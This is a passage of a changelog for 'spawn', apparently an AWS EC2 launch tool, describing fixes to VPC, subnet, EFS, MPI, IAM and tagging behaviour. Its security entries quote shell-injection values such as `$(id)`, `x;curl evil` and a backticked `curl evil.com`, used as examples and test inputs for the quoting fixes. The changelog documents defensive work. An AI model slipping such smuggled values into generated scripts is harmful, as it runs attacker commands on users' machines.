  cohort went terminal, spawn drained the instances and then deleted the per-AZ
  placement groups it had created — but `TerminateInstances` is asynchronous and EC2
  refuses to delete a group while any instance still references it. The delete lost
  that race on essentially every failed launch, printing
  `InvalidPlacementGroup.InUse` and moving on. Nine orphaned groups were found in one
  region of one account.
  Cleanup now retries for up to 60 seconds, waiting the members out. The budget is
  short deliberately: an empty placement group is **free**, so the only cost of giving
  up is quota pressure, and blocking the CLI's exit for minutes over a free resource
  would be the worse trade. If it does give up, the message now includes the exact
  `aws ec2 delete-placement-group` command instead of only reporting the failure.
  A permissions or not-found error still returns immediately rather than burning the
  budget to re-learn it.
- **Placement-group deletion ignored `--region` entirely** (#685). The second,
  independent cause of the same orphans, found while fixing the first:
  `CreatePlacementGroup` pinned the EC2 client to the launch region, but
  `DeletePlacementGroup` took no region at all and used the client's *default* one. So
  a cohort launched into a non-default region created its group in one region and
  tried to delete it in another — failing `InvalidPlacementGroup.Unknown`, which is
  not a retryable condition, so the group was abandoned on the first attempt
  regardless of how long cleanup waited. A same-named group genuinely present in the
  default region would have been deleted instead.
  The region is now a required parameter, so every caller must supply one, and a gate
  rejects any regional EC2 call in `pkg/aws` built on the default-region config —
  that shape is the bug, and `DescribeRegions` is the one legitimate exception.

- **Two job arrays launched close together could share an id** (#710). The
  per-launch array id's suffix was documented as a random value and was in fact
  `time.Now().UnixNano() % 0xFFFFFF` — a clock reading. It repeated outright on a
  coarse clock (`time.Now()` has *microsecond* resolution on macOS, where two
  consecutive calls return the identical value), and even on a nanosecond clock it
  wrapped every ~16.8 ms, so two launches that far apart collided deterministically.
  This matters because #691 made the `RunInstances` ClientToken derive from that id,
  specifically so two launches sharing a `--job-array-name` could not share a token.
  A colliding id brought #691's failures back: EC2 either rejects the cohort with
  `IdempotentParameterMismatch`, or returns the **first** launch's reservation, so
  spawn can report success while holding instance IDs that are already terminated.
  The suffix is now 32 bits from `crypto/rand` — not `math/rand`, because the value
  reaches a ClientToken and a predictable token is how an unrelated launch could be
  made to collide with yours on purpose.
  #691's own gate had been failing 5 runs out of 5 on macOS while passing in CI on
  Linux, which is how this surfaced: a uniqueness assertion satisfied by clock
  granularity is not an assertion. The replacement mints 2000 ids in a tight loop,
  which outruns any wall clock on any platform, and separately rejects a
  monotonically-increasing source so a regression to any counter is caught too.
- **`spawn launch` warns when an instance is too small to enforce its own TTL**
  (#682). `spored` enforces TTL, idle and cost limits from *inside* the instance, so
  a box too starved to make progress is also too starved to run the loop that would
  kill it — the enforcement mechanism and the thing it must survive are the same
  resource. A 0.5 GiB instance wedged during a package install and was still running
  at **twice** its 6-minute TTL, with no completion record and no signal of any kind,
  until someone noticed and killed it by hand.
  Below 1 GiB, launch now says so before any AWS resource is created, names the
  specific `--ttl` that may not hold, and points at `spawn doctor` to check whether a
  reaper covers the account — because from the outside this is indistinguishable from
  a long-running job.
  Deliberately a **warning, not a refusal**: a nano instance running a trivial
  command works fine, and the demonstrated failure needed a tiny box *and* a heavy
  bootstrap together. The second half lived inside the user's `--command`, where
  spawn cannot see it — so refusing on memory alone would block working launches to
  prevent a combination spawn cannot detect. The floor is 1 GiB because 0.5 GiB
  demonstrably failed and 4 GiB demonstrably worked and nothing between was tested;
  a higher floor would be inventing evidence.

- **A transient DNS failure at boot permanently failed an EFS mount** (#704). The
  generated storage script attempted `mount -t nfs4` exactly once. A mount target
  that was already `available` **in the instance's own subnet** still produced
  `mount.nfs4: Failed to resolve server fs-….efs.us-east-1.amazonaws.com` while
  general DNS worked fine and the mount target's IP mounted first try — EFS DNS can
  lag mount-target availability. One blip therefore became a launch that boots,
  bills and runs nothing, because #668's readiness barrier correctly refuses to
  start a workload against a directory that is not mounted.
  The mount now retries six times over about a minute, with no delay added to the
  common case where the first attempt succeeds — **and then falls back to the mount
  target's IP**, which is the part that actually fixes it. A hardware smoke settled
  that: the retry ran exactly as designed and *all six attempts failed*, because EFS
  DNS propagation for a freshly created mount target outlasts any retry budget worth
  spending at boot. Mounting by IP succeeds first try with identical options.
  `/etc/fstab` still carries the DNS name, never the IP, so the entry survives a
  mount-target replacement — the IP is strictly a boot-time workaround.
  The IP lookup needs `elasticfilesystem:DescribeMountTargets`. Without it, launch
  warns and the mount relies on DNS alone rather than failing. spawn prefers a mount
  target in the instance's own subnet, then its AZ, then any available one, since
  crossing an AZ bills per GiB — though a cross-AZ mount still beats a workload that
  cannot see its data.
  Found by the storage leg of `make smoke`. The tests run the generated shell under
  bash against a stubbed `mount` that fails for the DNS name and succeeds for the IP,
  because the bug was invisible to text assertions — the mount command itself was
  correct.

## [0.120.0] - 2026-10-05

### Added

- **`make smoke` now covers the storage path.** The hardware-sensitivity manifest flagged
  `pkg/userdata/storage.go` as changed by #680 — and the smoke did not exercise it, which
  is the gap that matters most there: that file generates the mount, fstab and
  `/etc/profile.d` shell, and its unit tests can only check the rendered *text* and that
  it parses. Neither can tell you the mount appeared or that the profile export carries
  the right value.
  The new leg creates an EFS filesystem and mount target, launches with `--efs-id`, then
  asserts `/run/spawn/storage-ready` reads `ok`, `/efs` is in `/proc/mounts`, and sourcing
  `/etc/profile.d/efs.sh` yields the mount point. It tears the fixture down in the
  trap-based cleanup, mount target before filesystem before security group, and still
  leak-checks independently afterwards.
  It is **opt-in** (`SMOKE_STORAGE=1`) because it has not yet produced a clean run, and
  an untrustworthy check is worse than a missing one — the standard already applied to
  the EFA fabric probe. Four runs produced three different false signals, every one a bug
  in the script rather than in spawn: `--on-complete terminate` killed the instance
  before the checks ran (so all three returned empty and read as mount failures),
  hand-escaped JSON swallowed a `$`, and an escaped `grep` pattern reached the instance
  literally and reported "mpirun reached 0 of 2 nodes" on a healthy cluster. The SSM
  helper now builds its payload with `python -c json.dumps` instead of shell
  interpolation — the same change of representation `pkg/mpicohort/assembler.go` makes by
  base64-encoding the peers file.
  The product findings underneath were real and are filed as **#704**: the EFS mount is
  attempted once, so a transient DNS failure at boot fails it permanently even though
  general DNS worked, the VPC had DNS enabled, and mounting by the mount target's IP
  succeeded first try with the identical options.

- **The sweep parameter environment is now verified by executing it** (#531). That fix —
  single-quoting `spawn:param:*` tag values into `/etc/profile.d/spawn-params.sh` instead
  of double-quoting them — was already in place and had only ever been verified by
  reading. #680 showed why that is not enough: its nested-quote rendering was
  syntactically valid and silently produced the wrong value.
  The new test **extracts the real export loop from the generated bootstrap** (rather
  than restating it, which would only verify the copy), runs it against a tag stream
  containing `$HOME/out`, `run "A"`, `it's`, `$(id -u)`, backticks, a mixed value and a
  path with a space, then parses the result with `bash -n` and sources it. Every value
  must come back byte for byte, and `$HOME` is set to a sentinel that would be obvious
  if it ever expanded. Confirmed to fail when the double-quoted form is restored.
  Also verified, and needing no change: param **names** cannot inject into that file.
  `shellIdentifier` (`^[A-Za-z_][A-Za-z0-9_]*$`) rejects `learning-rate`, `x;id`, spaces,
  `$(…)` and leading digits before launch, with a message explaining that parameters
  become `PARAM_<key>` variables. Without it, a name like `x;curl evil` would have landed
  as a second statement in a file every login shell sources.

- **Every launch flag is now classified for the parameter-sweep path** (#697). The sweep
  path drops flags **by construction**: the dispatch builds a two-field `LaunchConfig`
  instead of calling `buildLaunchConfig`, and `buildLaunchConfigFromParams` merges rows
  onto an empty struct. So a flag reaches sweep rows only if someone hand-wrote a shim —
  which has been done one category at a time, after each was reported (#525 spend
  controls, #539 IAM twice, #549 DNS, #667 networking for single launches only,
  #673/#674/#675).
  Measured: of **127** `launchCmd` flags, 44 are honoured on the sweep path, **83 are
  dropped**, and **72 of those have no param-file key either** — so there is no way to
  express the setting on a sweep at all. The gaps include *all* EFS and FSx flags (a
  sweep cannot mount shared storage), `--security-group-ids`/`--subnet-id` (so #667 is
  only half-fixed), and `--pre-stop`, the hook that syncs results before termination.
  `sweepFlagCoverage` classifies each flag as honoured, not-applicable, or a known gap
  with its issue, and three gates keep it honest: an unclassified flag fails the build, a
  gap must cite an issue, and a flag *claimed* as honoured must actually be referenced on
  the sweep path — because a manifest that drifts into wishful thinking is how #539's
  second half survived. The gate found seven flags I had not classified on its first run.
  This does not fix the gaps; it stops new ones being added silently. #697 carries the
  structural fix (pass the real config in and let rows override it).

### Deprecated

- **`--cartesian` and `--use-reservation` now warn instead of silently doing nothing**
  (#674, #675). Both were parsed into package globals that nothing read, so passing
  either was accepted, had no effect, and said nothing.
  Neither is being implemented, deliberately. The cartesian product **already exists** as
  the param file's `grid:` key (`pkg/params.expandGrid`), and the input `--cartesian`
  implies — a repeatable `--param lr=0.1,0.2` — does not exist: `--params` is inline JSON
  that fails closed with a clear message, and `params:` in a file is already a list of
  complete sets with no lists to cross. `--reservation-id` (#216) supersedes
  `--use-reservation` and is wired through to `RunInstances`. Implementing either would
  add a second way to do something that already works.
  Correction to #674's original text, which was mine: it claimed `--cartesian` "silently
  produces the wrong run count". It does not — with a param file the count comes from
  `params:`/`grid:` and the flag is simply inert. The consequence was over-stated.

### Fixed

- **`--vpc` is now honoured; it previously launched in the default VPC regardless**
  (#673). The flag was bound to a package global that **nothing read** — there was no
  `VPCID` field on `LaunchConfig` at all — and all five consumers called `GetDefaultVPC`
  unconditionally. So `spawn launch --vpc vpc-0abc…` was accepted, exited 0, and put the
  instance in the **default** VPC, with its managed security group created there too.
  The failure was silent and landed on network placement: wrong subnet, wrong route
  table, no route to an EFS or FSx mount target, and SG rules written into a VPC the
  instance was not in. An account whose research VPC is not the default could not target
  a VPC at all.
  All five sites now go through one `ResolveVPC` (explicit-or-default) rather than each
  assuming the default — the MPI and Windows security groups, FSx's subnet choice when
  `--subnet-id` is absent, and `GetSubnetForAZ`. Threading it into the storage paths
  matters as much as the SG ones: a filesystem created in the default VPC while the
  instance is elsewhere presents as a broken mount, not as a dropped flag.
  Passing `--vpc` and `--subnet-id` together is now validated up front, because it is the
  natural way to use `--vpc` and EC2's own error for a mismatch arrives only at
  `RunInstances` and names neither flag. The check is advisory on a describe failure —
  a better error, not a new gate.
  A gate fails the build on any direct `GetDefaultVPC` call from the launch path. Five
  independent sites each assuming the default is *why* this flag did nothing, and fixing
  some while leaving others is exactly how #539 and #667 each ended up fixed on one path
  and broken on another.
  Still dropped on the parameter-sweep path, tracked in #697 with the rest.

### Security

- **`security.ShellEscape` is deleted; every caller now uses real single-quoting**
  (#680). It was `strconv.Quote` — Go/C escaping inside **double** quotes, where a POSIX
  shell still expands `$VAR`, `$(…)` and backticks — while being named as though it were
  the safe choice. Deleted rather than deprecated, because the name was the trap: it was
  the obvious thing to reach for, and it was the unsafe one.
  **The storage user-data was the worst of it.** Mount points, mount options, filesystem
  DNS names and device names all went through it, producing three distinct defects for an
  ordinary EFS mount point:
  `mkdir -p "/efs$(id -u)"` ran the substitution at boot; `echo "export EFS_MOUNT="/efs""`
  nested quotes and was correct only by accident; and `/my efs` rendered as
  `export EFS_MOUNT=/my`, leaving `efs` to be run as a command on **every login** —
  a path with a space is legal and needs nothing exotic. The fstab lines interpolated the
  mount point raw into a double-quoted `echo`, so a substitution executed there too; they
  are now single-quoted as a whole, since fstab wants literal text. The attached-volume
  lines use `printf` with the path quoted, because `$SPAWN_DEV` must still expand.
  **`spawn config set` executed values instead of storing them.** The key and value come
  from argv and the result runs on the instance, so `spawn config set k '$(id)'` ran `id`
  there. It also meant a value containing `$` simply could not be stored.
  Also: the dead `shellEscape` template registration in the MPI user-data is removed
  (#660 moved `--mpi-command` out of the template, leaving an unused escaper for the next
  person to reach for), and the pipeline-orchestrator lambda stopped interpolating a
  stage command **twice** — escaped into `STAGE_CMD`, and raw into
  `echo "Running stage command: …"`, where `$(…)` executed, and executed again when the
  stage really ran, so a substitution with side effects happened twice.
  A gate now fails the build on any `func ShellEscape(` or `strconv.Quote` in
  `pkg/security`. It is worth a gate rather than a comment because a **passing** test
  called `TestShellEscapeAttackPatterns` fed in `$(whoami)` and `` `curl evil.com` `` and
  asserted only that the result *started with a double quote* — the very property that
  made it unsafe. A test named for attack patterns was certifying the hole. Its input
  list is kept and now run through a **real shell**, requiring each value to round-trip
  byte for byte.

## [0.119.0] - 2026-10-04

### Added

- **A hardware-sensitivity manifest, a smoke script, and a gate for unset template
  fields** — the testing half of what v0.118.0 taught. Of the eleven fixes in that
  release, **four were findable only on real hardware** while the unit suite stayed
  green, and three pre-existing tests actively asserted the broken behaviour as correct.
  `scripts/hardware-sensitive.txt` lists the paths whose correctness is not provable
  without an instance, each with the bug that earned it a place — generated shell
  (`pkg/userdata`, `pkg/launcher/bootstrap.go`), SSM orchestration (`pkg/mpicohort`),
  and whether AWS *accepts* and then *authorizes* a request (`pkg/aws/securitygroup.go`,
  `pkg/aws/iam.go`). `make smoke-needed` reports whether anything since the last tag
  touched them, so that question stops being answered from memory at tagging time;
  test-file changes are excluded, because changing a test cannot change what an
  instance does.
  `make smoke` is today's hand-assembled verification written down: an MPI cohort
  checked for rank spread across every node, `cloud-init status`, `--mpi-command`
  argument preservation, and an `fi_pingpong -p efa` fabric check — then an
  **independent** leak check that asks AWS rather than trusting the terminate calls,
  because a drain that silently terminated nothing was one of the bugs (#683). About
  $0.05 and ten minutes.
  A new `TestMemberUserDataHasNoEmptyInterpolations` renders user-data through the
  **production** builder and fails on the signatures of an unset field — `s3:///`, a
  malformed ARN, an unresolved `{{...}}`, a literal `<no value>`. This is the #684
  class: the test that should have caught it set `BinariesBucket` *itself*, so it proved
  the template could interpolate a bucket while never checking that any caller did.
  Confirmed to fail when #684 is reintroduced.

### Fixed

- **`make smoke` could not find the binary, and its EFA fabric check reported a false
  failure.** `make build` writes `bin/spawn`; the target passed `SPAWN=./spawn`, so the
  smoke added in #688 refused to start on its first real use. The `fi_pingpong` step
  escaped `$PATH` through a JSON parameter, came back empty, and was reported as a
  failure — so it now uses the absolute `/opt/amazon/efa/bin/fi_pingpong` (which is what
  AWS's own EFA docs use) and distinguishes **inconclusive** from **failed**. A check
  that cannot run must not print ❌, because a smoke that cries wolf is a smoke people
  stop reading.

- **`--s3-read` / `--s3-write` were silently ignored on the parameter-sweep path**
  (#539, #614). #539 was "the sweep path accepts the IAM flags, never reads them, and
  never warns" — every row fell back to the shared `spored-instance-role`, whose fixed
  policy grants S3 only on spawn's own infrastructure buckets, so a workload reading the
  caller's bucket booted, billed, and died on its first `aws s3` call with 403.
  That was fixed for the flags which existed then. **#614 later added
  `--s3-read`/`--s3-write` to the single-instance condition and not to the sweep one**,
  so those two kept the original behaviour — the same bug, re-created in the same place,
  because the condition was *duplicated* rather than shared.
  Both paths now call one `cliIAMFlagsRequireCustomProfile()` predicate, so a flag is
  honoured everywhere or nowhere, and the sweep path builds the same scoped bucket
  policy via `taskStagingPolicy` that the single-instance and task paths build. A gate
  asserts neither path re-spells the condition inline.

- **`spawn status -o json` now has a test proving stdout is parseable** (#540). The
  substance of that report was already fixed — verified live on a `t4g.small`:
  `exit=0`, 868 bytes of valid JSON on stdout, and the four agent log lines that broke
  the reporter's `json.loads` correctly on stderr, along with every field they asked for
  (`ttl.remaining_seconds`, `ttl.terminate_at`, `on_complete.sentinel_present`,
  `cost.cost_limit` / `cost_limit_remaining` / `effective_rate`).
  What was missing was the guard the report explicitly asked for. spored's renderer has
  `TestRenderStatusJSON_StdoutIsPureJSON`; **spawn's relay had no test at all**, and it
  adds six human annotations of its own — any one of them on stdout breaks the document.
  The stream decision is now an `emitStatus` seam with annotations passed in, so the
  rule is asserted rather than assumed.
- **`--efa` cohorts could never enroll: the probe could not find `fi_info`** (#693). The
  enrollment probe sourced `/etc/profile.d/mpi.sh` and `/etc/profile.d/efa.sh` and then
  ran `fi_info -p efa` — but `aws-efa-installer` puts `fi_info` in
  **`/opt/amazon/efa/bin`** and its PATH line in its own
  **`/etc/profile.d/zippy_efa.sh`**, while the `efa.sh` spawn writes exports only
  `FI_PROVIDER` and `FI_EFA_USE_DEVICE_RDMA` and touches PATH not at all. So in SSM's
  non-login shell the probe reported `efa provider missing` every ~5s until the
  5-minute budget expired, whether EFA was installed or not.
  This is #684 again for EFA: that fix covered the `mpirun` half and assumed the
  EFA half worked by analogy. The probe now **appends both install directories to PATH
  directly** rather than trusting any profile file — a probe keyed on a third party's
  script name breaks when they rename it — and globs `*efa*.sh` so the installer's own
  script is sourced too.
  The tests are now **executable**: they run the generated probe under the exact PATH an
  SSM shell gets, with a stub binary, and assert it exits 0 — plus the inverse, that a
  genuinely missing tool still fails. The previous tests confirmed the check *existed*,
  not that it could ever *succeed* on a real install layout, which is precisely the gap
  that let this ship.
- **Relaunching a job array under a previously-used `--job-array-name` failed** (#691).
  The `RunInstances` ClientToken was left empty, so cohort fell back to
  `Token(cluster, entity, generation)` — keyed on the job-array **name**. The per-launch
  `jobArrayID` (which carries a date and random suffix) was passed as the CohortID and
  never reached the token, so two invocations sharing a name sent the **same token per
  index**. Within EC2's retention window that is wrong twice over: differing parameters
  give `IdempotentParameterMismatch` and fail the whole cohort (observed 18.5 hours
  after the first launch), and *identical* parameters make EC2 return the **original
  reservation** — so spawn could report a successful launch while holding instance IDs
  that are already terminated, or two arrays could share instances.
  Re-issuing a token is correct *within* one launch (retries and AZ-fallback rungs must
  not double-launch) and wrong *across* launches. The token is now keyed on
  `jobArrayID`, which is stable within a reconcile and distinct between invocations;
  `spawn array retry` passes the original `rec.ArrayID`, so a retried member keeps its
  first attempt's token and stays idempotent against it.
- **`--estimate-only` rendered a sub-hour TTL as "0 hr"** (#662 follow-up). `--ttl 30m`
  printed `TTL cost: $0.07 (0 hr × 2 instances)` — the dollar figure correct and the
  duration rounded to zero, which is the worst combination in a cost preview, since "0"
  is the number a reader takes at face value. Durations now render as `30m`, `90m` or
  `4 hr` without rounding anything away.

- **A fully-configured launch could exceed AWS's 50-tag limit and fail `RunInstances`
  outright** (#477). The parameter loop capped itself at 35 with a comment claiming that
  "stays under AWS 50-tag limit" — but it counted only the sweep parameters and ignored
  the ~45 tags the other sections had already appended. AWS does not truncate; it
  rejects the call. Measured on a maximal launch (FSx + EFS + both webhooks + job array
  + sweep + every lifecycle flag): **46 tags with no parameters at all**, 54 with ten,
  and 79 with sixty. Ten is an ordinary sweep.
  Parameter tags are now emitted **last** and budgeted against what the launch actually
  used, in **sorted** order. The old loop ranged over the map directly, so *which*
  parameters survived depended on Go's randomised iteration order — two members of the
  same sweep could record different points in the parameter space.
  Only parameters are droppable, and the priority is deliberate: `spawn:*` lifecycle
  tags are spored's contract (dropping `spawn:ttl` would disable TTL enforcement and
  bill open-endedly, far worse than a failed launch), `--tag` is an explicit request, and
  `spawn:param:*` is a convenience record whose authoritative copy is the sweep manifest.
  A truncation now warns on stderr, naming how many were dropped and why.
- **Setting both `--spot-webhook-url` and `--completion-webhook-url` failed the launch**
  — found while fixing #477, and reachable with **two flags** rather than a maximal
  config. Both webhook blocks emitted `spawn:webhook-correlation` and
  `spawn:webhook-timeout`, and EC2 rejects the whole `RunInstances` call on a repeated
  key. Verified against real EC2:
  `InvalidParameterValue: Duplicate tag key 'spawn:webhook-correlation' specified.`
  Tags are now deduped as a pass over the assembled list rather than by threading a
  helper through every section, so a future section cannot forget to use it.

- **`spawn launch` rejected the form its own `--help` documented as required** (#499).
  The spore name had to be **positional**, while the `--name` flag's help described
  itself as "required" and the "Direct with flags" example omitted the positional
  entirely. Following either piece of the built-in documentation failed — with
  `accepts 1 arg(s), received 0`, a message that never mentions the name, so the error
  pointed at nothing.
  `runLaunch` already read both forms (`--name` wins, the positional fills in); only
  `cobra.ExactArgs(1)` stood in the way, and it could not express the rule, because it
  sees the positional count and nothing else. Either form is now accepted, the help text
  says so, and the three failure cases each say what is actually wrong: no name at all,
  two names that disagree, or more than one positional.

## [0.118.0] - 2026-10-04

### Added

- **`spawn reaper status` now reports version skew against the CLI** (#654). The CLI and
  a deployed reaper are **independently deployed** and nothing synchronises them:
  upgrading spawn doesn't touch a reaper already in an account, and `spawn reaper deploy`
  installs the artifact for whichever version it was asked for. Skew is therefore the
  normal state, not an exception — the spore.host-operated reaper sat untouched from
  2026-07-31 to 2026-10-04 while the CLI went from ~v0.9x to v0.116.0, missing an alarm,
  two IAM grants and a packaging fix, with nothing anywhere saying so.
  Status now always prints a `Version` line and, when it differs from the running CLI,
  names both and the remedy (re-run `spawn reaper deploy`). It is deliberately **not** an
  error: an older reaper still reaps, and the goal is visibility, not a gate.
  Three cases are handled distinctly so the line stays trustworthy: matching versions
  print **nothing** extra (a check that talks when it has nothing to say gets skipped,
  which is how a real skew gets missed); a missing `spawn:version` tag reads as
  **unknown** rather than a mismatch, because claiming one would be a guess; and a **dev
  build** says why it isn't comparing instead of crying wolf on every working tree.
  The `spawn reaper` help text now states the independent-versioning contract outright.

### Fixed

- **Job-array and MPI instances never ran their bootstrap: the user-data was
  double-gzipped** (#671). `buildJobArrayMemberConfig` base64-decoded
  `baseConfig.UserData` — which `encodeUserData` had already **gzipped** — appended the
  MPI script to those *compressed bytes*, and encoded again. What shipped was
  `gzip(gzip(bootstrap) + mpiScript)`. cloud-init unwraps one layer, finds binary, logs
  `Unhandled non-multipart (text/x-not-multipart) userdata` and skips the lot.
  So **no job-array or MPI member has ever bootstrapped**: no `spored`, no peers file,
  no hostfile — and with `spored` absent, nothing on-instance enforced `spawn:ttl`
  either, leaving only the reaper between a failed cohort and indefinite billing.
  There is now a `decodeUserData` that is the true inverse of `encodeUserData`, with a
  gzip magic-number check so the Windows path (deliberately plain base64, since
  EC2Launch cannot decompress) round-trips through it too. The test decodes the final
  user-data exactly once, as cloud-init does, and asserts it starts with `#!`.
- **A failed cohort left its instances running** (#671). The drain was gated on
  `ReachedPhase == PhaseCohortAssembly`, but `Phase` is **ordered** and an instance
  exists and bills from `PhaseLaunchAcked` onward — so a cohort dying at `running` or
  `enrolled` had launched instances and left every one of them up. Two
  `c8g.48xlarge` ($7.66/hr each) sat running until terminated by hand, which is also why
  the placement group could not be deleted (`InvalidPlacementGroup.InUse`).
  A phase predicate cannot be made safe here: `PhaseLaunchAcked` is `iota` 0, so a
  member that never launched is indistinguishable from one that did. The drain is now
  **unconditional** on cohort failure, so with nothing launched it costs one
  `DescribeInstances`, against a missed drain costing $15/hr.
  **This fixed the gating but not the leak** — see #683 below. The drain it was gating
  could never match an instance, which only became visible on real hardware.
- **`--mpi` had never worked end-to-end** (#684). Two independent defects, either of
  which was enough to kill every MPI launch, and both only visible on real hardware.
  **The cluster SSH key could not be distributed.** `mpirun` reaches the other ranks over
  ssh as root, so every node needs rank 0's public key. That went through S3 — but
  `MPIConfig.BinariesBucket` was **never set by any caller**, so the command rendered
  `s3:///`, failed parameter validation, and **aborted cloud-init's `scripts-user`
  module**, taking the rest of the MPI setup with it. `mpirun` was therefore never
  installed and `cloud-init status` reported `error`. Naming the bucket would not have
  helped: the spored role grants only `s3:GetObject` on `spawn-binaries-*`, so the upload
  would have been `AccessDenied`. The field's own comment claimed a default
  ("defaults to spawn-binaries-{region}") that no code ever applied; it is now removed
  rather than left as a trap.
  Distribution rides **SSM**, the control-plane path the peers file already used — no
  bucket, no IAM grant, and no cross-node polling race. The **private** key is still
  generated on rank 0 and never transported: user-data would expose it to any local user
  via IMDS, and SSM would record it in CloudTrail. The key is installed *before* the
  peers file, because the peers file is the release signal and `mpirun` follows it
  immediately.
  **The enrollment probe could never pass.** On AL2023 `openmpi` installs to
  `/usr/lib64/openmpi/bin`, which is **not on the default PATH** — the user-data adds it
  via `/etc/profile.d/mpi.sh`. But SSM runs a **non-login shell**, so profile.d is never
  sourced and `command -v mpirun` found nothing however correctly MPI had installed.
  Confirmed on a live `c6i.large`: `mpirun` present at `/usr/lib64/openmpi/bin/mpirun`,
  invisible to `command -v`, and resolved immediately after sourcing the profile. The
  probe now sources the MPI/EFA profiles first, so it tests the environment the workload
  actually runs in, and tolerates their absence for a custom AMI that already has
  `mpirun` on PATH.
  Together these are why **4 of 4** MPI launches failed at `phase=enrolled` with
  `PhaseBudgetExceeded`, across two instance families — and why #671 and #683 had to be
  fixed first: each failure was hiding the next.
- **A member whose peers file never arrived waited forever** (#684). The MPI user-data
  had an unbounded wait on `/etc/spawn/job-array-peers.json`, so a node the control plane
  never reached sat there until its TTL — and on a box where `spored` failed to install,
  nothing enforced the TTL either (#682), so it could sit indefinitely on a billing
  instance. It now gives up after 10 minutes, says why, and writes a failed completion
  record so `--on-complete` still fires.

- **The failed-cohort drain had never terminated anything** (#683). It filtered on
  `in.Tags["spawn:job-array-id"]`, but `listInstancesInRegion` lifts every recognised
  `spawn:*` tag into a **named field** and writes only *unrecognised* keys into the
  `Tags` map — so that lookup was always `""`, the comparison was always true, and every
  instance was skipped. A failed cohort leaked its members, which is the cost leak #671
  was filed about in the first place.
  What hid it: the drain printed nothing on success *or* on matching zero instances, so
  the two were indistinguishable; and cohort's own cancellation path does terminate the
  *cancelled* member, so a failed 2-node run left exactly one instance behind and looked
  like a race rather than a dead code path. The member actually left billing was the one
  that **failed** — the culprit.
  Reproduced twice on real hardware (two `c6i.large`, then two `c5n.9xlarge`), with
  CloudTrail showing a single `TerminateInstances` call that came from cohort, not from
  the drain. It is also why `InvalidPlacementGroup.InUse` appeared in #671's report: the
  deferred placement-group cleanup ran while an undrained instance still referenced it.
  Now filtered on the named field through an `instanceBelongsToJobArray` predicate that
  **matches nothing for an empty cohort id** (an empty id must not match every instance
  in the account), and the drain reports what it found and did in every case, including
  a loud warning when a cohort that launched drains nothing. A new gate fails the build
  on any read of a recognised `spawn:*` key from `InstanceInfo.Tags`, since "that map
  holds all the tags" is the reusable mistake rather than this one line.
- **`--subnet-id` could not be used with `--mpi` or `--count`** (#683). A subnet exists
  in exactly one availability zone, but the MPI AZ-fallback chain rewrote
  `Placement.AvailabilityZone` as it advanced, so a pinned subnet in `us-east-1b` got
  `us-east-1a` and EC2 refused every member:
  `InvalidParameterValue: Value (us-east-1a) for parameter availabilityZone is invalid.
  Subnet '...' is in the availability zone us-east-1b`.
  An explicit subnet is now AZ-bound and takes the same single-rung path a fixed
  `--placement-group` already took. The conflict was **unreachable until #667** stopped
  dropping `--subnet-id`, so this combination had never actually worked — and the unit
  tests could see the subnet arrive on the config but not that it then contradicted the
  AZ chain. Found on real hardware.
- **`--security-group-ids` and `--subnet-id` were silently dropped on every ordinary
  launch** (#667). Both were parsed into package globals whose only assignment onto the
  `LaunchConfig` lived on the **batch-queue** path, so `spawn launch
  --security-group-ids sg-...` exited 0 and launched the instance into the VPC's
  **default** security group and an arbitrary subnet, with nothing warning.
  The symptom always surfaced far from the cause: `--efs-id` mounts **hang** rather than
  fail (the mount target sits in another security group, so 2049 is blocked and a `hard`
  NFS mount blocks forever), `EnsureLustrePorts` iterated an empty slice so FSx never got
  port 988 opened, and SSH from a restricted CIDR was simply refused.
  Dropping `--subnet-id` compounds it, because the subnet also picks the **AZ**, and a
  one-zone EFS mount target is only reachable from its own zone.
- **A managed MPI security group no longer discards the ones you asked for** (#667).
  When spawn created a `spawn-mpi-*` group it **overwrote** `SecurityGroupIDs` outright,
  so under `--mpi` the flag was dropped a second time even once it reached the config —
  and there was no flag-level workaround at all. The managed group is now **merged**
  alongside any caller-supplied groups (an instance may carry 5), which is precisely the
  case — an EFS/FSx mount target, a restricted SSH CIDR — where the extra group is needed.
- **Three launch flags were accepted and did nothing**; each now has an issue and a gate
  (#673, #674, #675). A new `TestLaunchFlagsAreWired` parses the package, finds every
  variable bound to a launch flag, and fails if nothing reads it — the compiler cannot,
  because the binding call itself counts as a use. It skips any function declaring the
  name locally, which is what exposed `--vpc`: each consumer has its own
  `vpcID, err := GetDefaultVPC(...)` shadow, so a grep reads those as uses of the flag.
  Found: **`--vpc`** (#673) has no `LaunchConfig` field at all, so it launches in the
  default VPC; **`--cartesian`** (#674) produces the wrong sweep **run count**, the worst
  of the three since it bills for a sweep of the wrong shape; **`--use-reservation`**
  (#675) is vestigial since #216's `--reservation-id` and yields an on-demand instance at
  on-demand price while reading as "use my reserved capacity". All three are allowlisted
  with their issue numbers so the gate enforces from now on without hiding the debt.

- **`--s3-read` without `--s3-write` failed the entire launch** (#669).
  `taskStagingPolicy` appended its `s3:PutObject` statement unconditionally, but on the
  launch path there are no output buckets and no results bucket — and `dedupeBuckets`
  drops empty strings — so the statement shipped as
  `{"Action":["s3:PutObject"],"Resource":[]}`. IAM rejects the **whole document** for an
  empty `Resource`, not just the offending statement, so the instance profile could not
  be created and `spawn launch --s3-read my-bucket` died with
  `MalformedPolicyDocument` before reaching EC2.
  A read-only grant now contains no write statement at all, rather than an unscoped one.
  The same bug hit `--s3-read-write` used on its own, which is the Snakemake S3-storage
  plugin's shape, so that path was equally broken.
  Guarding the write statement alone would have swapped one invalid document for
  another, since `"Statement":[]` is just as malformed; with nothing to grant the
  function now returns an empty string and the policy is simply not attached (both
  `PutRolePolicy` call sites were already guarded on that).
  The pre-existing test called this exact case but asserted only that the document began
  with `"Version"`, so it passed while IAM refused the result — it now checks the two
  shapes IAM actually rejects.

- **`--command` started before its storage mounts and before MPI setup** (#668, #664).
  `--command` is launched from `linuxBootstrapBody`, which is concatenated at a fixed
  point **before** the storage script and before anything a caller appends afterwards.
  So the workload ran while its prerequisites did not exist — a task given `--efs-id`
  reported `df: /efs: No such file or directory`, and an MPI member started before
  `mpirun` had a hostfile or a single peer. #166 fixed this ordering for `--user-data`
  by appending it after the storage script; `--command` lives inside the static body and
  could not be moved the same way.
  There is now a **readiness barrier**: the bootstrap declares the gates a workload must
  wait for, each producer signals its own, and `--command` waits for all of them before
  starting. The storage gate **verifies the mounts are live in `/proc/mounts`** rather
  than trusting an exit code — the storage script ends in `echo >> /etc/fstab`, which
  succeeds whether or not anything mounted, so there was never a status worth reading.
  Only EFS and FSx are required; attached EBS volumes mount with `nofail` by design and
  must not strand a workload that never referenced them.
  A failed or missing prerequisite now **fails the workload loudly in
